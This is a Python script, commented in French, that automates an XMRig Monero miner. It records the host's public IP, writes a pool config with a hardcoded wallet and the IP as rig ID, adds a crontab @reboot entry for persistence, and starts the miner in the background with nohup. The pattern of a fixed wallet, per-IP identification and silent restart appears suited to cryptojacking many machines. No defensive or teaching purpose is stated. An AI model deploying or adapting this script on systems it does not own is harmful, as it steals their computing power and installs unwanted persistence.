#!/usr/bin/env python3
import requests
import json
import os
import subprocess
import sys

def get_public_ip():
    """Récupère l'IP publique"""
    try:
        services = [
            'https://api.ipify.org',
            'https://ipinfo.io/ip',
            'https://icanhazip.com',
            'https://ident.me'
        ]
        
        for service in services:
            try:
                response = requests.get(service, timeout=10)
                if response.status_code == 200:
                    return response.text.strip()
            except:
                continue
        
        response = requests.get('https://ifconfig.me/ip', timeout=10)
        return response.text.strip()
        
    except Exception as e:
        print(f"Erreur lors de la récupération de l'IP: {e}")
        return "unknown-ip"

def create_xmrig_config(public_ip):
    """Crée le fichier config.json pour XMRig"""
    config = {
        "autosave": True,
        "cpu": True,
        "opencl": False,
        "cuda": False,
        "pools": [
            {
                "url": "xmrpool.eu:9999",
                "user": "84tcWxb4fwwLRZj2PLJmEqVPo8QpMRFrWfgqWzRLM9q7WpfdVFK4VW6JANPTUPZqUwCbTUH767p5E5b6BEcqcJhzPkGEY1N",
                "rig-id": public_ip,
                "keepalive": True,
                "tls": True
            }
        ]
    }
    
    config_path = os.path.join(os.getcwd(), 'config.json')
    
    with open(config_path, 'w') as f:
        json.dump(config, f, indent=4)
    
    print(f"✅ Config créé avec succès: {config_path}")
    print(f"🌐 IP publique détectée: {public_ip}")
    return config_path

def setup_autostart():
    """Configure le démarrage automatique via crontab"""
    try:
        xmrig_path = os.path.join(os.getcwd(), 'xmrig')
        config_path = os.path.join(os.getcwd(), 'config.json')
        log_path = os.path.join(os.getcwd(), 'xmrig.log')
        
        cron_command = f"@reboot cd {os.getcwd()} && nohup ./xmrig --config={config_path} >> {log_path} 2>&1 &"
        
        try:
            current_cron = subprocess.check_output(['crontab', '-l'], stderr=subprocess.DEVNULL).decode().strip()
        except subprocess.CalledProcessError:
            current_cron = ""
        
        if cron_command not in current_cron:
            if current_cron:
                new_cron = current_cron + "\n" + cron_command + "\n"
            else:
                new_cron = cron_command + "\n"
            
            process = subprocess.Popen(['crontab', '-'], stdin=subprocess.PIPE)
            process.communicate(input=new_cron.encode())
            
            if process.returncode == 0:
                print("✅ Démarrage automatique configuré via crontab")
                return True
            else:
                print("❌ Erreur lors de la configuration du crontab")
                return False
        else:
            print("ℹ️  Démarrage automatique déjà configuré")
            return True
            
    except Exception as e:
        print(f"❌ Erreur lors de la configuration du démarrage automatique: {e}")
        return False

def start_xmrig():
    """Lance XMRig en arrière-plan"""
    try:
        config_path = os.path.join(os.getcwd(), 'config.json')
        log_path = os.path.join(os.getcwd(), 'xmrig.log')
        
        xmrig_path = os.path.join(os.getcwd(), 'xmrig')
        if not os.path.exists(xmrig_path):
            print(f"❌ XMRig non trouvé: {xmrig_path}")
            return False
        
        cmd = f"nohup ./xmrig --config={config_path} >> {log_path} 2>&1 &"
        
        subprocess.Popen(cmd, shell=True, cwd=os.getcwd())
        
        print(f"🚀 XMRig démarré en arrière-plan")
        print(f"📊 Logs disponibles dans: {log_path}")
        return True
        
    except Exception as e:
        print(f"❌ Erreur lors du démarrage de XMRig: {e}")
        return False

def main():
    print("🔄 === Configuration complète XMRig === 🔄")
    print()
    
    print("🔍 Étape 1/4: Récupération de l'IP publique...")
    public_ip = get_public_ip()
    print()
    
    print("📝 Étape 2/4: Création du fichier config.json...")
    config_path = create_xmrig_config(public_ip)
    print()
    
    print("⚙️  Étape 3/4: Configuration du démarrage automatique...")
    autostart_ok = setup_autostart()
    print()
    
    print("🚀 Étape 4/4: Démarrage de XMRig...")
    xmrig_ok = start_xmrig()
    print()
    
    print("📋 === RÉSUMÉ === 📋")
    print(f"IP publique: {public_ip}")
    print(f"Config créé: {'✅' if os.path.exists(config_path) else '❌'}")
    print(f"Démarrage auto: {'✅' if autostart_ok else '❌'}")
    print(f"XMRig lancé: {'✅' if xmrig_ok else '❌'}")
    print()
    
    if autostart_ok and xmrig_ok:
        print("🎉 Configuration terminée avec succès !")
        print("🔄 XMRig se lancera automatiquement au prochain redémarrage")
    else:
        print("⚠️  Certaines étapes ont échoué, vérifiez les messages ci-dessus")

if __name__ == "__main__":
    main() 
